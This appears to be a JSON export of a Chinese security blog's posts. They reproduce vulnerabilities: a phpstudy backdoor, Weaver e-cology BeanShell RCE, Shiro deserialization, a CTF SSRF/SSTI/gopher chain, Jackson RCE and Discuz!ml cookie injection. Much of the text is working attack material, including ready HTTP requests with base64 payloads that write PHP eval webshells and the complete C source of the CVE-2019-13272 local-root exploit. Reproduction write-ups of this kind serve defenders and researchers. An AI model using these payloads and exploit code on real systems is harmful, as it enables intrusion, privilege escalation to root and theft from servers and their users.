","link":"https://www.svenbeast.com/post/WH877Va6k/"},{"title":"phpstudy后门利用方法及getshell","content":"0x01 phpstudy利用方法 请求任意后缀为php的文件 目标环境为php5.2,5.4,且不能为nts 存在Accept-Encoding: gzip,deflate 此处填写base64加密后的payload：accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw GET /phpinfo.php HTTP/1.1 Host: 192.168.1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27 Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Sec-Fetch-Site: none, accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw Accept-Encoding: gzip,deflate Accept-Language: zh-CN,zh;q=0.9 0x02 getshell 远程连接 system('echo ^&lt;?php @eval($_POST[&quot;shell&quot;])?^&gt;&gt;PHPTutorial\\WWW\\shell.php'); ↓ c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInNoZWxsIl0pP14+PlBIUFR1dG9yaWFsXFdXV1xzaGVsbC5waHAnKTs= GET /phpinfo.php HTTP/1.1 Host: 192.168.1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27 Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Sec-Fetch-Site: none, accept-charset: c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInNoZWxsIl0pP14+PlBIUFR1dG9yaWFsXFdXV1xzaGVsbC5waHAnKTs= Accept-Encoding: gzip,deflate Accept-Language: zh-CN,zh;q=0.9 0x03 无文件落地getshell 利用phpstudy的后门实现无文件落地蚁剑getshell，但有时会不成功，设置完毕后连接即可 0x04 可能会遇到的问题 若无法成功连接，可能生成目录不对，执行命令tree /f查看文件树，找到可访问路径生成shell GET /phpinfo.php HTTP/1.1 Host: 192.168.1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27 Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Sec-Fetch-Site: none, accept-charset: c3lzdGVtKCd0cmVlIC9mJyk7 Accept-Encoding: gzip,deflate Accept-Language: zh-CN,zh;q=0.9 ","link":"https://www.svenbeast.com/post/2OBQlt_Ta/"},{"title":"泛微e-cology OA Beanshell组件远程代码执行(复现及POC)","content":"0x01 访问未授权访问页面 http://oa.xxxx.com/weaver/bsh.servlet.BshServlet 0x02 输入payload exec(&quot;whoami&quot;); 输入命令执行函数，传入cmd命令，查看回显是否成功执行 0x03 将exec进行Unicode编码绕过部分站点exec过滤 \\u0065\\u0078\\u0065\\u0063(&quot;whoami&quot;); PS：https://github.com/jas502n/e-cology 少宇师傅的POC地址，后期批量有时间就写，现在70周年国庆节，有点忙。 ","link":"https://www.svenbeast.com/post/9rcdl83tA/"},{"title":"Shiro<=1.2.4反序列化的简单理解及POC","content":"0x01. 缘故 甲方曝了一个shiro反序列化，在验证的时候就多了解了一下这个漏洞，测试时也是用了市面上流传的poc验证了一下，不过并不理想，后来实际了解后，发现原因是使用的编码不够多，故继续造轮子，由此出此篇文章，主要目的就是发个轮子（-.-! ，毕竟有点鸽~）。 0x02.简单shiro&lt;=1.2.4文字理解 因为shiro对cookie里的rememberme字段进行了反序列化，所以如果知道了shiro的编码方式，然后将恶意命令用它的编码方式进行编码并放在http头的cookie里，在shiro对提交的cookie的rememberme字段进行反序列化时，也就执行了插入的命令，最终造成了命令执行 我说的比较简单好理解，实际代码流程很多帖子有，不是做代码分析的了解到这里就没问题，造轮子的话够了 0x03. POC 这个才是发这篇文章的最终原因，毕竟造了轮子不发出来没人分享多没意思，借鉴了weblogicscan的poc框架，表示谢谢 测试时发现市面上大部分的poc集成的编码和使用的ysoserial里的类只有1-2种，故收集了github上大部分的编码，共18种，其实还有两种不过发现无法使用便在代码中注释掉了，也集成了ysoserial里的7个类，我把这个就称为7个模块拉 所以这个POC配合dnslog平台验证漏洞是否存在对我来说是个神器，如果当做exp使用虽可以但较为浪费时间，不过我相信对大部分人来说，证明存在漏洞后，进一步利用就更为有动力了，会有干劲去想办法的 PS:解压密码:svenbeast 链接: https://pan.baidu.com/s/1x776TO4yiNhqSMKnRYpWRw（已失效） 提取码: dzeb Github:https://github.com/sv3nbeast/ShiroScan,请帮忙点个star，谢谢😘 ","link":"https://www.svenbeast.com/post/fkOpKjach/"},{"title":"奇安信内推码","content":"本人内推码，仅供应届生使用哦：rwCPse69 有问题的话可以在博客留言，我看到会回复 奇安信校招报名地址：http://campus.chinahr.com/views/qianxin/seminar.html# ","link":"https://www.svenbeast.com/post/SBIMn8jWq1/"},{"title":"一个神秘的入群题解题过程","content":"Alert 1 引言 群早就加了，但是因为一次稀里糊涂的事情认识一个帅气的师傅，然后稀里糊涂的就是有个朋友也想进群。 然后朋友稀里糊涂的让我帮她做一下入群题，好吧，咳咳，朋友还在成长过程中，我帮一下顺便写下来帮她理解一下，所以我尽量写得清楚明白的令人发指~ 开始回顾 Alert 2 绕过过滤得到SSRF 访问目标站点得到源码(跟着我标记的序号理解源码) 源码解析（开头序号在底部）： &lt;?php highlight_file(__FILE__); function check_inner_ip($url) //7.方法在这里，接收了url参数 { //8.用了个正则表达式判传来的url值里面是否存在 $match_result=preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result) //9.他设定的值，存在返回true真，不存在返回false假 { //10. !代表false,有句话说的是，假真为假，假假为真 die('url fomat error'); //11.如果序号8那步判断里面不存在设定的值则输 //12. 出url fomat error这个来，然后代码停止运行 } try //13.上面的if如果条件不满足(因为die，如果满足后脚本就停止 //14. 运行了)，那么到了这里继续向下执行 { $url_parse=parse_url($url); //15. 这里对url值进行解析，得到他的组成部分 } //16.比如他的host,port这些 ，存到url_parse里 //17.https://www.cnblogs.com/gengyi/p/6390084.html,parse_url函数介绍 catch(Exception $e) { //18.https://www.w3school.com.cn/php/php_exception.asp,try catch用 //19.法介绍，这里意思是如果try那步的解析出现了异常，catch就会捕捉到 //20.并执行他里面设定的代码 die('url fomat error'); //21. 如果try解析出现异常，就输出url fomat error， return false; //22.并且停止运行脚本 } $hostname=$url_parse['host']; //22.如果try没出现异常，就提取里面的host //23.(就是域名或者IP)存到hostname里 $ip=gethostbyname($hostname); //24.将域名转换成ip，存入ip里 $int_ip=ip2long($ip); //25.对ip进行转换成便于比较的整型存入int_ip return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16; //26. ip2long('127.0.0.0')&gt;&gt;24结果是127，就是取的第一段那里 //27.这里是把这4个段和传入的url参数转换成的整型存入的int_ip //28.做一个比较，如果咱们输入的是他识别成是这4个段内的， //29.他就返回true,反之为false，到此这个方法结束，继续向下执行 } function safe_request_url($url) //4.方法找到在这里，往下看，接受url参数 { if (check_inner_ip($url)) //5.出现check_inner_ip方法，对url参数处理，我们 //6.去上面寻找这个方法 { //30.得到了check_inner_ip方法返回的true或false echo $url.' is inner ip'; //31.如果是返回true则输出 echo $url.' is inner ip' } else //32.如果是返回false,继续向下执行，这个才是咱们想要的 { //33.也就是我们想办法让check_inner_ip返回false是触发SSRF关键 //34.后面是用php执行的curl操作:https://www.jianshu.com/p/07c4dddae43a $ch = curl_init(); //35.设定ch为句柄，这里的句柄就是谁当了句柄，控制他 //36.就能控制 curl操作，就把他当成curl 后面的-O -o这些 //37.命令吧-.-!，他是一个通用概念，不是针对php和curl什么的，百度搜吧 curl_setopt($ch, CURLOPT_URL, $url); //38.https://www.runoob.com/php/func-curl_setopt.html，curl_setopt详解 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); //39.上面的就把他当成对curl操作的各种设置和咱们传入的url参数 $output = curl_exec($ch); //40.执行curl操作，将得到的网页存入output $result_info = curl_getinfo($ch); //41.将句柄ch的内容编码(content_type)，网络地址(url)，http状态 //42.码(http_code)等等很多存入result_info if ($result_info['redirect_url']) //43.如果里面有redirect_url，向下执行 { safe_request_url($result_info['redirect_url']); //44.将跳转的页面用safe_request_url过滤一遍 } curl_close($ch); //45.关闭curl var_dump($output); //46.将得到的页面输出出来 } } $url = $_GET['url']; //1.传入url参数，如果参数不为空，则将 if(!empty($url)){ //2.会执行safe_request_url函数，向上寻找 safe_request_url($url); //3.safe_request_url方法 } ?&gt; 可以明显看到传入url参数，进行检查操作，通过的话就dump出来，具体看代码中的注释，排版已经尽力，全文纯手打，末尾附件里面有txt格式的代码解析，最终得到SSRF payload: ?url=http://0.0.0.0/flag.php ?url=http://127.0.0.1./flag.php 根据parse_url解析和curl解析的不同导致还有另外一种payload，不写了，够用就好~要不还得写原理-.-! 得到内网网段 Alert 3 进行内网探测 有内网网段，当然下一步是进行对网段扫描，得到他的存活IP和开放端口 选择Cluster bomb模式，添加参数，字典的话我也打包在文章末尾 ps:由于服务器问题，这个真实跑的时候很慢，想变快可以把端口只设置成3306，8080，不过我有时间，让他跑呗，做就做个全套的 最终得到2个IP:port：172.11.243.81:8080和172.11.243.218:3306 分别回显 #172.11.243.81:8080 5.7.25-0ubuntu0.16.04.2/\u0006,mysql_native_password\u001b\u0001��\u0004Got packets out of order #172.11.243.218:3306 import flask import os app = flask.Flask(__name__) app.config['HINT'] = os.environ.pop('HINT') @app.route('/') def index(): return open(__file__).read() @app.route('/yulige/&lt;path:yulige&gt;') def yulige(yulige): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s return flask.render_template_string(safe_jinja(yulige)) if __name__ == '__main__': app.run(&quot;0.0.0.0&quot;,port=8080) 出现了代码，那么去搜一下，百度搜索 flask ctf 进去看看这个flask python框架有什么cxk操作 稀里糊涂的看看，得出构造payload为 payload: ？url=http://172.11.243.81:8080/yulige/{{url_for.__globals__[%27current_app%27].config[%27HINT%27]}} //悄悄说一句：郁离歌我也想要天眼 Alert 4 通过SSRF+gopher得到flag 目前已经得到数据库名yuligeeee123321 ，那么开始的正则里有着gopher协议，那么我们就可以靠gopher协议对mysql进行攻击。 mysql没设置密码的话我们就可以直接ssrf+gopher得到数据库里面的内容的，下次遇到类似的能想起来还有这么个操作就好 祭出一个脚本Gopherus，这个属于SSRF配合gopher协议的利用工具，文尾已打包 python2编写的：https://github.com/tarunkant/Gopherus 脚本运行截图 payload：太长了，自己用脚本跑一下吧，每次得到的payload要继续用url编码再次编码，因为他是SSRF，是存在跳板机的，跳板机会先解一次码 show database —得到数据库，information_schema fla4441111g select group_concat(table_name) from information_schema.tables where table_schema='fla4441111g' —得到表名， F1111llllggggg select group_concat(column_name) from information_schema.columns where table_schema='fla4441111g' and table_name='F1111llllggggg' —得到字段， flag select flag from fla4441111g.F1111llllggggg —得到flag， flag{QAQ_YLG_NO1} 文中用到的附件集合： http://129.28.179.23/upload/入群题.zip ","link":"https://www.svenbeast.com/post/KQ6xR86Hl/"},{"title":"Linux桌面版本地提权(CVE-2019-13272漏洞复现)","content":"0x01 前言 2019年7月29日，网上出现的CVE-2019-13272（Linux本地提权漏洞）的利用脚本，下班后有时间就复现一下 0x02 环境 环境准备:18.04.1 Ubuntu Desktop版本 Linux ubuntu 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux POC: // Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272) // Uses pkexec technique // --- // Original discovery and exploit author: Jann Horn // - https://bugs.chromium.org/p/project-zero/issues/detail?id=1903 // --- // &lt;bcoles@gmail.com&gt; // - added known helper paths // - added search for suitable helpers // - added automatic targeting // - changed target suid exectuable from passwd to pkexec // https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272 // --- // Tested on: // - Ubuntu 16.04.5 kernel 4.15.0-29-generic // - Ubuntu 18.04.1 kernel 4.15.0-20-generic // - Ubuntu 19.04 kernel 5.0.0-15-generic // - Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic // - Linux Mint 19 kernel 4.15.0-20-generic // - Xubuntu 16.04.4 kernel 4.13.0-36-generic // - ElementaryOS 0.4.1 4.8.0-52-generic // - Backbox 6 kernel 4.18.0-21-generic // - Parrot OS 4.5.1 kernel 4.19.0-parrot1-13t-amd64 // - Kali kernel 4.19.0-kali5-amd64 // - Redcore 1806 (LXQT) kernel 4.16.16-redcore // - MX 18.3 kernel 4.19.37-2~mx17+1 // - RHEL 8.0 kernel 4.18.0-80.el8.x86_64 // - Debian 9.4.0 kernel 4.9.0-6-amd64 // - Debian 10.0.0 kernel 4.19.0-5-amd64 // - Devuan 2.0.0 kernel 4.9.0-6-amd64 // - SparkyLinux 5.8 kernel 4.19.0-5-amd64 // - Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64 // - Manjaro 18.0.3 kernel 4.19.23-1-MANJARO // - Mageia 6 kernel 4.9.35-desktop-1.mga6 // - Antergos 18.7 kernel 4.17.6-1-ARCH // --- // user@linux-mint-19-2:~$ gcc -s poc.c -o ptrace_traceme_root // user@linux-mint-19-2:~$ ./ptrace_traceme_root // Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272) // [.] Checking environment ... // [~] Done, looks good // [.] Searching for known helpers ... // [~] Found known helper: /usr/sbin/mate-power-backlight-helper // [.] Using helper: /usr/sbin/mate-power-backlight-helper // [.] Spawning suid process (/usr/bin/pkexec) ... // [.] Tracing midpid ... // [~] Attached to midpid // To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;. // See &quot;man sudo_root&quot; for details. // // root@linux-mint-19-2:/home/user# // --- #define _GNU_SOURCE #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;signal.h&gt; #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt; #include &lt;sched.h&gt; #include &lt;stddef.h&gt; #include &lt;stdarg.h&gt; #include &lt;pwd.h&gt; #include &lt;sys/prctl.h&gt; #include &lt;sys/wait.h&gt; #include &lt;sys/ptrace.h&gt; #include &lt;sys/user.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/stat.h&gt; #include &lt;linux/elf.h&gt; #define DEBUG #ifdef DEBUG # define dprintf printf #else # define dprintf #endif #define SAFE(expr) ({ \\ typeof(expr) __res = (expr); \\ if (__res == -1) { \\ dprintf(&quot;[-] Error: %s\\n&quot;, #expr); \\ return 0; \\ } \\ __res; \\ }) #define max(a,b) ((a)&gt;(b) ? (a) : (b)) static const char *SHELL = &quot;/bin/bash&quot;; static int middle_success = 1; static int block_pipe[2]; static int self_fd = -1; static int dummy_status; static const char *helper_path; static const char *pkexec_path = &quot;/usr/bin/pkexec&quot;; static const char *pkaction_path = &quot;/usr/bin/pkaction&quot;; struct stat st; const char *helpers[1024]; const char *known_helpers[] = { &quot;/usr/lib/gnome-settings-daemon/gsd-backlight-helper&quot;, &quot;/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper&quot;, &quot;/usr/lib/unity-settings-daemon/usd-backlight-helper&quot;, &quot;/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper&quot;, &quot;/usr/sbin/mate-power-backlight-helper&quot;, &quot;/usr/bin/xfpm-power-backlight-helper&quot;, &quot;/usr/bin/lxqt-backlight_backend&quot;, &quot;/usr/libexec/gsd-wacom-led-helper&quot;, &quot;/usr/libexec/gsd-wacom-oled-helper&quot;, &quot;/usr/libexec/gsd-backlight-helper&quot;, &quot;/usr/lib/gsd-backlight-helper&quot;, &quot;/usr/lib/gsd-wacom-led-helper&quot;, &quot;/usr/lib/gsd-wacom-oled-helper&quot;, }; /* temporary printf; returned pointer is valid until next tprintf */ static char *tprintf(char *fmt, ...) { static char buf[10000]; va_list ap; va_start(ap, fmt); vsprintf(buf, fmt, ap); va_end(ap); return buf; } /* * fork, execute pkexec in parent, force parent to trace our child process, * execute suid executable (pkexec) in child. */ static int middle_main(void *dummy) { prctl(PR_SET_PDEATHSIG, SIGKILL); pid_t middle = getpid(); self_fd = SAFE(open(&quot;/proc/self/exe&quot;, O_RDONLY)); pid_t child = SAFE(fork()); if (child == 0) { prctl(PR_SET_PDEATHSIG, SIGKILL); SAFE(dup2(self_fd, 42)); /* spin until our parent becomes privileged (have to be fast here) */ int proc_fd = SAFE(open(tprintf(&quot;/proc/%d/status&quot;, middle), O_RDONLY)); char *needle = tprintf(&quot;\\nUid:\\t%d\\t0\\t&quot;, getuid()); while (1) { char buf[1000]; ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0)); buf[buflen] = '\\0'; if (strstr(buf, needle)) break; } /* * this is where the bug is triggered. * while our parent is in the middle of pkexec, we force it to become our * tracer, with pkexec's creds as ptracer_cred. */ SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL)); /* * now we execute a suid executable (pkexec). * Because the ptrace relationship is considered to be privileged, * this is a proper suid execution despite the attached tracer, * not a degraded one. * at the end of execve(), this process receives a SIGTRAP from ptrace. */ execl(pkexec_path, basename(pkexec_path), NULL); dprintf(&quot;[-] execl: Executing suid executable failed&quot;); exit(EXIT_FAILURE); } SAFE(dup2(self_fd, 0)); SAFE(dup2(block_pipe[1], 1)); /* execute pkexec as current user */ struct passwd *pw = getpwuid(getuid()); if (pw == NULL) { dprintf(&quot;[-] getpwuid: Failed to retrieve username&quot;); exit(EXIT_FAILURE); } middle_success = 1; execl(pkexec_path, basename(pkexec_path), &quot;--user&quot;, pw-&gt;pw_name, helper_path, &quot;--help&quot;, NULL); middle_success = 0; dprintf(&quot;[-] execl: Executing pkexec failed&quot;); exit(EXIT_FAILURE); } /* ptrace pid and wait for signal */ static int force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) { struct user_regs_struct regs; struct iovec iov = { .iov_base = &amp;regs, .iov_len = sizeof(regs) }; SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL)); SAFE(waitpid(pid, &amp;dummy_status, 0)); SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &amp;iov)); /* set up indirect arguments */ unsigned long scratch_area = (regs.rsp - 0x1000) &amp; ~0xfffUL; struct injected_page { unsigned long argv[2]; unsigned long envv[1]; char arg0[8]; char path[1]; } ipage = { .argv = { scratch_area + offsetof(struct injected_page, arg0) } }; strcpy(ipage.arg0, arg0); for (int i = 0; i &lt; sizeof(ipage)/sizeof(long); i++) { unsigned long pdata = ((unsigned long *)&amp;ipage)[i]; SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long), (void*)pdata)); } /* execveat(exec_fd, path, argv, envv, flags) */ regs.orig_rax = __NR_execveat; regs.rdi = exec_fd; regs.rsi = scratch_area + offsetof(struct injected_page, path); regs.rdx = scratch_area + offsetof(struct injected_page, argv); regs.r10 = scratch_area + offsetof(struct injected_page, envv); regs.r8 = AT_EMPTY_PATH; SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &amp;iov)); SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL)); SAFE(waitpid(pid, &amp;dummy_status, 0)); } static int middle_stage2(void) { /* our child is hanging in signal delivery from execve()'s SIGTRAP */ pid_t child = SAFE(waitpid(-1, &amp;dummy_status, 0)); force_exec_and_wait(child, 42, &quot;stage3&quot;); return 0; } // * * * * * * * * * * * * * * * * root shell * * * * * * * * * * * * * * * * * static int spawn_shell(void) { SAFE(setresgid(0, 0, 0)); SAFE(setresuid(0, 0, 0)); execlp(SHELL, basename(SHELL), NULL); dprintf(&quot;[-] execlp: Executing shell %s failed&quot;, SHELL); exit(EXIT_FAILURE); } // * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * * * static int check_env(void) { const char* xdg_session = getenv(&quot;XDG_SESSION_ID&quot;); dprintf(&quot;[.] Checking environment ...\\n&quot;); if (stat(pkexec_path, &amp;st) != 0) { dprintf(&quot;[-] Could not find pkexec executable at %s&quot;, pkexec_path); exit(EXIT_FAILURE); } if (stat(pkaction_path, &amp;st) != 0) { dprintf(&quot;[-] Could not find pkaction executable at %s&quot;, pkaction_path); exit(EXIT_FAILURE); } if (xdg_session == NULL) { dprintf(&quot;[!] Warning: $XDG_SESSION_ID is not set\\n&quot;); return 1; } if (system(&quot;/bin/loginctl --no-ask-password show-session $XDG_SESSION_ID | /bin/grep Remote=no &gt;&gt;/dev/null 2&gt;&gt;/dev/null&quot;) != 0) { dprintf(&quot;[!] Warning: Could not find active PolKit agent\\n&quot;); return 1; } if (stat(&quot;/usr/sbin/getsebool&quot;, &amp;st) == 0) { if (system(&quot;/usr/sbin/getsebool deny_ptrace 2&gt;1 | /bin/grep -q on&quot;) == 0) { dprintf(&quot;[!] Warning: SELinux deny_ptrace is enabled\\n&quot;); return 1; } } dprintf(&quot;[~] Done, looks good\\n&quot;); return 0; } /* * Use pkaction to search PolKit policy actions for viable helper executables. * Check each action for allow_active=yes, extract the associated helper path, * and check the helper path exists. */ int find_helpers() { char cmd[1024]; snprintf(cmd, sizeof(cmd), &quot;%s --verbose&quot;, pkaction_path); FILE *fp; fp = popen(cmd, &quot;r&quot;); if (fp == NULL) { dprintf(&quot;[-] Failed to run: %s\\n&quot;, cmd); exit(EXIT_FAILURE); } char line[1024]; char buffer[2048]; int helper_index = 0; int useful_action = 0; static const char *needle = &quot;org.freedesktop.policykit.exec.path -&gt; &quot;; int needle_length = strlen(needle); while (fgets(line, sizeof(line)-1, fp) != NULL) { /* check the action uses allow_active=yes*/ if (strstr(line, &quot;implicit active:&quot;)) { if (strstr(line, &quot;yes&quot;)) { useful_action = 1; } continue; } if (useful_action == 0) continue; useful_action = 0; /* extract the helper path */ int length = strlen(line); char* found = memmem(&amp;line[0], length, needle, needle_length); if (found == NULL) continue; memset(buffer, 0, sizeof(buffer)); for (int i = 0; found[needle_length + i] != '\\n'; i++) { if (i &gt;= sizeof(buffer)-1) continue; buffer[i] = found[needle_length + i]; } if (strstr(&amp;buffer[0], &quot;/xf86-video-intel-backlight-helper&quot;) != 0 || strstr(&amp;buffer[0], &quot;/cpugovctl&quot;) != 0 || strstr(&amp;buffer[0], &quot;/package-system-locked&quot;) != 0 || strstr(&amp;buffer[0], &quot;/cddistupgrader&quot;) != 0) { dprintf(&quot;[.] Ignoring blacklisted helper: %s\\n&quot;, &amp;buffer[0]); continue; } /* check the path exists */ if (stat(&amp;buffer[0], &amp;st) != 0) continue; helpers[helper_index] = strndup(&amp;buffer[0], strlen(buffer)); helper_index++; if (helper_index &gt;= sizeof(helpers)/sizeof(helpers[0])) break; } pclose(fp); return 0; } // * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * int ptrace_traceme_root() { dprintf(&quot;[.] Using helper: %s\\n&quot;, helper_path); /* * set up a pipe such that the next write to it will block: packet mode, * limited to one packet */ SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT)); SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000)); char dummy = 0; SAFE(write(block_pipe[1], &amp;dummy, 1)); /* spawn pkexec in a child, and continue here once our child is in execve() */ dprintf(&quot;[.] Spawning suid process (%s) ...\\n&quot;, pkexec_path); static char middle_stack[1024*1024]; pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack), CLONE_VM|CLONE_VFORK|SIGCHLD, NULL)); if (!middle_success) return 1; /* * wait for our child to go through both execve() calls (first pkexec, then * the executable permitted by polkit policy). */ while (1) { int fd = open(tprintf(&quot;/proc/%d/comm&quot;, midpid), O_RDONLY); char buf[16]; int buflen = SAFE(read(fd, buf, sizeof(buf)-1)); buf[buflen] = '\\0'; *strchrnul(buf, '\\n') = '\\0'; if (strncmp(buf, basename(helper_path), 15) == 0) break; usleep(100000); } /* * our child should have gone through both the privileged execve() and the * following execve() here */ dprintf(&quot;[.] Tracing midpid ...\\n&quot;); SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL)); SAFE(waitpid(midpid, &amp;dummy_status, 0)); dprintf(&quot;[~] Attached to midpid\\n&quot;); force_exec_and_wait(midpid, 0, &quot;stage2&quot;); exit(EXIT_SUCCESS); } int main(int argc, char **argv) { if (strcmp(argv[0], &quot;stage2&quot;) == 0) return middle_stage2(); if (strcmp(argv[0], &quot;stage3&quot;) == 0) return spawn_shell(); dprintf(&quot;Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\\n&quot;); check_env(); if (argc &gt; 1 &amp;&amp; strcmp(argv[1], &quot;check&quot;) == 0) { exit(0); } /* Search for known helpers defined in 'known_helpers' array */ dprintf(&quot;[.] Searching for known helpers ...\\n&quot;); for (int i=0; i&lt;sizeof(known_helpers)/sizeof(known_helpers[0]); i++) { if (stat(known_helpers[i], &amp;st) == 0) { helper_path = known_helpers[i]; dprintf(&quot;[~] Found known helper: %s\\n&quot;, helper_path); ptrace_traceme_root(); } } /* Search polkit policies for helper executables */ dprintf(&quot;[.] Searching for useful helpers ...\\n&quot;); find_helpers(); for (int i=0; i&lt;sizeof(helpers)/sizeof(helpers[0]); i++) { if (helpers[i] == NULL) break; if (stat(helpers[i], &amp;st) == 0) { helper_path = helpers[i]; ptrace_traceme_root(); } } return 0; } 0x03 复现 保证ubuntu有gcc哦 usage:gcc poc.c ./a.out 提权成功 该漏洞利用简单，影响范围广,需注意的是只对Desktop有效，server不可以哦，这方面略显鸡肋 0x04 修复 漏洞修复补丁： https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee ","link":"https://www.svenbeast.com/post/U4oArG5HS/"},{"title":"FasterXML Jackson远程命令执行漏洞（复现CVE-2019-12384）","content":"1.首先打开http服务，这里用的是python3自带的，其他的也可，只要可以访问到 ps:python自带的这个服务从哪个文件夹打开，此文件夹为默认根目录 2.配置jruby，这里因为我之前配置过，所以已存在，并无影响，jruby已打包 ps:ln -s ~/jruby-9.2.7.0/bin/jruby /usr/local/bin/ 3.运行test.rb,进行命令执行 4.这里的inject.sql，为写命令的文件，此文件放在http服务的根目录里，jackson要能远程获取到 5.在完成第三步的时候，已经命令执行完成，在http服务的根目录会生成exploited.txt文件，里面是命令执行后得到的回显 PS：解压密码:svenbeast 链接: https://pan.baidu.com/s/1yhdmOz3QQ7Nm_Ar6m4-dWg 提取码: avpe ","link":"https://www.svenbeast.com/post/fasterxml-jackson-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2019-12384/"},{"title":"Discuz!ml3.3漏洞复现及分析(附POC)","content":"s1. 背景 在7月11日Discuz多语言版曝出存在RCE漏洞，所以官方下载源码对漏洞进行复现和分析 下载地址:https://discuz.ml/download 本人下的是3.3版本，不得不吐槽一下，下载速度比较慢，所以我同时下载的，最先完成的是3.3按本，也就用了。 s2. 安装 本人环境：php5.6+Nginx（windows推荐使用phpstudy） 下载源码后，解压至安装目录后访问:127.0.0.1/discuz!ml3.3/upload,进入此目标将开始安装 因为本人已经安装好，就不在滚键盘了，直接下一步即可，最后写上本机的数据库连接密码，在设置管理员账号密码即可 ps:安装后无图片显示，莫慌，不影响使用 s3. 代码执行 漏洞在于cookie的语言可控并且没有严格过滤，注入后导致可以远程代码执行 访问127.0.0.1/discuz!ml3.3/upload/home.php，访问别的php文件也可以，cookie字段中会出现xxxx_xxxx_language字段，根本原因就是这个字段存在注入，导致的RCE 抓包找到cookie的language的值修改为xxxx_xxxx_language=sc'.phpinfo().'，成功执行，这里的sc可以不带 构造一句话,连接蚁剑 payload：%27.%2Bfile_put_contents%28%27shell.php%27%2Curldecode%28%27%253C%253Fphp%2520eval%2528%2524_POST%255B%25221%2522%255D%2529%253B%253F%253E%27%29%29.%27 实际为：'.+file_put_contents('shell.php',urldecode('<?php eval($_POST[\"1\"]);?>')).' 可看到路径下生成shell.php，连接密码为1 检测脚本：https://github.com/theLSA/discuz-ml-rce 借用此作者的脚本，写的非常全，方便检测和验证 s4. 分析 在discuz!ml3.3\\upload\\source\\module\\portal的portal_index.php里存在着包含 跟踪template 在discuz!ml3.3\\upload\\source\\function的function_core.php文件中 他的返回值为DISCUZ_ROOT.cachefile，而cachefile，而cachefile，而cachefile在上面也有，可看出由各变量来进行组成的，其中的DISCUZ_LANG为可控制变量 discuz!ml3.3\\upload\\source\\class\\discuz下的discuz_application.php文件 ↑ 可看出这里直接将值传入到lng变量，继续跟踪 ↑ $lng直接赋给DISCUZ_LANG，所以DISCUZ_LANG常量为可控 因此payload通过修改cookie里的language字段内容传入，目前已经控制了文件名字，而Discuz会将我们写入的存入缓存，真正包含的是缓存文件 写入的缓存文件存在discuz!ml3.3\\upload\\data\\template ↑ debug的时候写入的缓存文件 ↑ checktplrefresh()函数中将cachefile传入parsetemplate(),然后拼接给cachefile传入parse_template(),然后拼接给cachefile传入parset​emplate(),然后拼接给headeradd，接着拼接给$template ↑ 